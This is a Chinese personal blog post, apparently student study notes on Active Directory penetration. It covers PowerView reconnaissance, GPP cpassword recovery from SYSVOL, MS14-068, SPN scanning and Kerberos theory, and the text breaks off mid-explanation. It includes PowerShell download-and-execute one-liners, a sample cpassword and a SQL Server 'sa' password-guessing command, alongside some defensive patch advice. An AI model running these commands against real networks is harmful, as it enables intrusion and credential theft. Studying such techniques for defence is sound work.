<!DOCTYPE html>
<html lang=九世>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x00前言昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。 0x01正文1.首先要知道那台是域控 121.查看自己的DNS地址2.扫描端口开了389的那台就是 2.使用powershell进行信息收集">
<meta name="keywords" content="Writing">
<meta property="og:type" content="article">
<meta property="og:title" content="细读域渗透文章得到的总结">
<meta property="og:url" content="http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/index.html">
<meta property="og:site_name" content="九世的博客">
<meta property="og:description" content="0x00前言昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。 0x01正文1.首先要知道那台是域控 121.查看自己的DNS地址2.扫描端口开了389的那台就是 2.使用powershell进行信息收集">
<meta property="og:locale" content="九世">
<meta property="og:image" content="https://wx3.sinaimg.cn/wap720/0064U3Yugy1fre4xtbm06j31be0qotcv.jpg">
<meta property="og:image" content="https://image.3001.net/images/20141002/14122235056423.jpg!small">
<meta property="og:updated_time" content="2018-12-16T03:21:28.522Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="细读域渗透文章得到的总结">
<meta name="twitter:description" content="0x00前言昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。 0x01正文1.首先要知道那台是域控 121.查看自己的DNS地址2.扫描端口开了389的那台就是 2.使用powershell进行信息收集">
<meta name="twitter:image" content="https://wx3.sinaimg.cn/wap720/0064U3Yugy1fre4xtbm06j31be0qotcv.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>细读域渗透文章得到的总结</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Proyectos</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/12/21/nmap-note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/12/14/第一个c2通信脚本/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post Siguiente</span>
      <span id="i-top" class="info" style="display:none;">Arriba</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&text=细读域渗透文章得到的总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&is_video=false&description=细读域渗透文章得到的总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=细读域渗透文章得到的总结&body=Check out this article: http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&title=细读域渗透文章得到的总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/12/16/细读域渗透文章得到的总结/&name=细读域渗透文章得到的总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00前言"><span class="toc-number">1.</span> <span class="toc-text">0x00前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01正文"><span class="toc-number">2.</span> <span class="toc-text">0x01正文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02相关资料"><span class="toc-number">3.</span> <span class="toc-text">0x02相关资料</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        细读域渗透文章得到的总结
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">九世的博客</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-12-16T02:47:24.000Z" itemprop="datePublished">2018-12-16</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Writing/">Writing</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>昨天看到一篇不错的域渗透文章。想理解里面的内容，然后耗费的时间有点多，不过收获还是很多的起码了解了域渗透该咋弄，怎么维持权限等等之类。由于时间不够无法搭建好环境进行域渗透学习（下午上学）。先写个目前总结的，等下个星期或者在学校搭建好环境在写一篇。<br><img src="https://wx3.sinaimg.cn/wap720/0064U3Yugy1fre4xtbm06j31be0qotcv.jpg" alt="0064U3Yugy1fre4xtbm06j31be0qotcv.jpg"></p>
<h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>1.首先要知道那台是域控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.查看自己的DNS地址</span><br><span class="line">2.扫描端口开了389的那台就是</span><br></pre></td></tr></table></figure>
<p>2.使用powershell进行信息收集</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/cheetz/PowerTools 用于域信息收集的项目</span><br><span class="line">1.先将这个项目下载到vps或本地通过ngrok映射到公网</span><br><span class="line">2.打开powershell执行：IEX (New.ObjectNet.WebClient).DownloadString(&apos;http://IP地址/powerview.ps1&apos;);Get-HostIP</span><br><span class="line"></span><br><span class="line">    Get-HostIP                      -   resolves a hostname to an IP</span><br><span class="line">    Check-Write                     -   checks if the current user can write to the specified file</span><br><span class="line">    Set-MacAttribute                -   Sets MAC attributes for a file based on another file or input (from Powersploit)</span><br><span class="line">    Invoke-CopyFile                 -   copies a local file to a remote location, matching MAC properties</span><br><span class="line">    Test-Server                     -   tests connectivity to a specified server</span><br><span class="line">    Get-UserProperties              -   returns all properties specified for users, or a set of user:prop names</span><br><span class="line">    Get-ComputerProperties          -   returns all properties specified for computers, or a set of computer:prop names</span><br><span class="line">    Get-LastLoggedOn                -   return the last logged on user for a target host</span><br><span class="line">    Get-UserLogonEvents             -   returns logon events from the event log for a specified host</span><br><span class="line">    Get-UserTGTEvents               -   returns TGT request events for a specified host</span><br><span class="line">    Invoke-CheckLocalAdminAccess    -   check if the current user context has local administrator access</span><br><span class="line">                                        to a specified host</span><br><span class="line">    Invoke-SearchFiles              -   search a local or remote path for files with specific terms in the name</span><br><span class="line">    Convert-NameToSid               -   converts a user/group name to a security identifier (SID)</span><br><span class="line">    Convert-SidToName               -   converts a security identifier (SID) to a group/user name</span><br><span class="line">    </span><br><span class="line">    详细使用：https://github.com/cheetz/PowerTools/tree/master/PowerView</span><br></pre></td></tr></table></figure>
<p>3.SYSVOL GPP漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">SYSVOL是指存储公共服务器副本的共享文件夹，它们在域中所有的域控制器之间复制.Sysvol文件夹是安装AD时创建的，它用来存放GPO，脚本等信息。同时，存放Sysvol文件文件夹中的信息，会复制到域中所有DC上。</span><br><span class="line"></span><br><span class="line">域服务器一般都会共享这个文件夹，或者搜索当前机器下的XML文件将包含凭据：groups.xml，scheduledtasks.xml，services.xml中，datasources.xml</span><br><span class="line"></span><br><span class="line">映射驱动（Drives.xml）</span><br><span class="line">数据源（DataSources.xml）</span><br><span class="line">打印机配置（Printers.xml）</span><br><span class="line">创建/更新服务（services.xml中）</span><br><span class="line">计划任务（ScheduledTasks.xml）</span><br><span class="line"></span><br><span class="line">由于经过身份验证的用户（任何域用户或受信任域中的用户）具有对SYSVOL的读取权限</span><br><span class="line"></span><br><span class="line">\192.168.50.205sysvolpentest.comPolicies&#123;84017B64-2662-4BA3-A06C-FB953CCBE92D&#125;UserPreferencesGroups.xml</span><br><span class="line">经过AES-256位加密</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cpassword=&quot;fUCMHAw9I2PdYRZEBMS54IvtPHX3ni44qRkWtfBtxoA&quot;</span><br><span class="line">可以使用AES私钥解密GPP密码</span><br><span class="line"></span><br><span class="line">微软在MSDN上发布了AES加密密钥（共享密钥）</span><br><span class="line">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</span><br><span class="line"></span><br><span class="line">使用PowerShell的脚本解密</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">寻找SYSVOL里的密码和攻击GPP（组策略偏好</span><br><span class="line">注：当创建了一个域用户后，将其添加到验证组策略对象。在SYSVOL的xml文件会有用户的配置文件</span><br><span class="line">http://www.91ri.org/14909.html</span><br><span class="line"></span><br><span class="line">防SYSVOL更新配置文件：</span><br><span class="line">防：</span><br><span class="line">*在用于管理GPO的计算机上安装KB2962486，以防止将新凭据置于组策略首选项中。</span><br><span class="line">*设置每个人访问权限</span><br><span class="line">*不在组策略中使用域控密码</span><br><span class="line">*设置共享文件夹SYSVOL的访问权限</span><br><span class="line">*删除现有的GPP里包含密码的XML文件。</span><br></pre></td></tr></table></figure>
<p>4.MS14-068攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">需要条件：</span><br><span class="line">域用户及其口令</span><br><span class="line">域用户对应sid</span><br><span class="line">域控地址 Win7及以上系统</span><br><span class="line">Tips：</span><br><span class="line">1. 操作系统要求Win7及以上，这是因为XP不支持导入Ticket</span><br><span class="line">2. 攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击</span><br><span class="line">3. 将Python脚本转成exe即可在任意一台Windows主机使用</span><br><span class="line">注意事项：</span><br><span class="line">Tips：</span><br><span class="line">1. 如果不先清除内存中的Ticket直接导入，有可能会失败</span><br><span class="line">2. 连接域控要使用域控地址，不要用IP</span><br><span class="line">利用方法：https://www.cnblogs.com/backlion/p/6820744.html?utm_source=itdadao&amp;utm_medium=referral</span><br><span class="line"></span><br><span class="line">MS14-068过程：</span><br><span class="line">1.请求没有PAC的Kerberos TGT认证票据作为标准用户，DC回复TGT</span><br><span class="line">2.生成一个伪造的PAC，没有密钥，所以生成的PAC使用域用户的密码数据用MD5算法而不是HMAC_MD5“签名”。</span><br><span class="line">3.作为TGS服务票据请求的一部分，使用伪造的PAC作为授权数据发送无PAC的TGT到DC。</span><br><span class="line">4.DC似乎被这个混淆了，所以它放弃了用户发送的不含PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到它自己的授权数据中，并将这个TGT发送给用户。</span><br><span class="line">5.这个伪造PAC的TGT使得用户可以成为易受攻击的DC上的域管理员。</span><br><span class="line"></span><br><span class="line">防御：安装检查KB3011780的安装</span><br></pre></td></tr></table></figure>
<p>5.SPN扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包</span><br><span class="line">SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内置帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。</span><br><span class="line">SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。</span><br><span class="line">powershell -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers&apos;); Discover-PSMSSQLServers&quot;</span><br></pre></td></tr></table></figure>
<p>6.扫描SQL Server</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*脚本地址：https://github.com/nullbind/Powershellery/tree/master/Stable-ish/MSSQL</span><br><span class="line">*用法：Import-Module .Get-SQLServerAccess.psm1或者放到VPS用下载并执行的方式来执行脚本</span><br><span class="line">*弱口令猜解：Get-SQLServerAccess -sqluser sa -sqlpass 123qwe!@#</span><br><span class="line">*寻找敏感数据：Get-SQLServerAccess -query &quot;select name as &apos;Databases&apos; from master..sysdatabases where HAS_DBACCESS(name) = 1&quot;</span><br><span class="line"></span><br><span class="line">非扫描式的SQL Server发现</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning</span><br></pre></td></tr></table></figure>
<p>7.票据</p>
<p><img src="https://image.3001.net/images/20141002/14122235056423.jpg!small" alt="14122235056423.jpg!small"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line">kerberons协议理解：</span><br><span class="line">Kerberos是windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份验证。相互认证或请求服务的实体被称为委托人(Principal)。参与的中央服务器被称为发布中心（简称KDC）。KDC有两个服务组成：身份验证服务（Authentication Server 简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。在windows域环境下，身份验证服务和票据授予服务可同时运行在任何可写域控服务器上。</span><br><span class="line"></span><br><span class="line">委托人（Principal）是一个具有唯一标识的实体，可以是一台计算机或一项服务，通过使用KDC颁发的票据来进行通信。委托人可以分为两类：用户和服务，分别具有不同种类的标识符。用户通过&quot;user@REALM&quot;格式的用户主体名称（User Principal Name,简称UPN来标识）。记住REALM一定是大写的。例如用户&quot;bob&quot;在&quot;bhusa.com&quot;域中应该表示为bob@BHUSA.com</span><br><span class="line"></span><br><span class="line">服务主题名称（Service Principal Name，简称SPN）是用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。例如，主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;,&quot;ldap/dc1&quot;和&quot;ldcap/dc1.bhusa.com/bhusa.com&quot;。参考全限定主机名和仅主机名，应该服务可能注册多个SPN</span><br><span class="line"></span><br><span class="line">同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么微软Kerberos环境中的一个必要租件。查询服务&quot;规范化&quot;名称，然后生成请求服务的SPN。</span><br><span class="line"></span><br><span class="line">用户要访问活动目录中的一项服务访问需经过以下几个步骤</span><br><span class="line">1.客户端对用户口令执行散列运算(hash)。此hash值（即用户密钥）成为客户端和KDC共享的长期密钥（long term key）</span><br><span class="line">2.KRB_AS_REQ-客户端加密一个时间戳，然后发送给身份验证服务</span><br><span class="line">3.KRB_AS_REP-身份验证服务会解密时间戳，若解密成功，表明了客户端获得某个特定用户的口令（即验证了用户的身份）</span><br><span class="line">①短期会话密钥，用于客户端向KDC发起后续的请求，该消息经客户端的长期密钥加密。（此短期会话密钥仅适用于该客户端和KDC之间）</span><br><span class="line">②票据授予票据（Ticket Granting Ticket，简称TGT），包含有关用户名、域名、时间和组成员资格等信息。该消息经仅可知KDC的密钥加密（在Windows环境中为krbtgt账户的NT-Hash）。记住KDC不记录状态：客户端每次请求访问一项服务时，TGT都会被转发。</span><br><span class="line">4.KRB_TGS_REQ-客户端使用AS返回的会话密钥构建访问特定服务的请求。客户端把TGT连同请求一起发送到票据授予服务</span><br><span class="line">5.KRB_TGS_REP-票据授予服务向客户端发送一个服务票据（Service Ticket，简称ST），包括两个部分</span><br><span class="line">*1远程服务器的部分-包括请求用户的组员资格，时间戳，用于客户端和远程服务器之间通信的会话密钥。使用远程服务器和</span><br><span class="line">KDC共享的长期密钥加密这部分消息</span><br><span class="line">*2.客户端的部分-包含用于客户端和远程服务器之间通信的会话密钥。使用步骤3中AS回复的短期会话密钥加密这部分消息</span><br><span 